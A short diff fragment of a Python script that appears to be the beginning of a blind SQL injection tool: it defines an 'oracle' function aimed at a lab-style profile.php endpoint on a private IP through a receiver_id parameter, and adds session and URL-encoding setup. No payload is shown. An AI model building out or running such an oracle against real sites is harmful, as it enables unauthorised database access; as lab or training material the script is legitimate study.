@@ -1,4 +1,8 @@
 import requests
+from urllib.parse import quote_plus
+
+url = sys.argv[1]
+session = requests.Session()
 
 def oracle(condition):
     url = 'http://192.168.209.240/pages/profile.php?user_id=1&receiver_id=' # change me
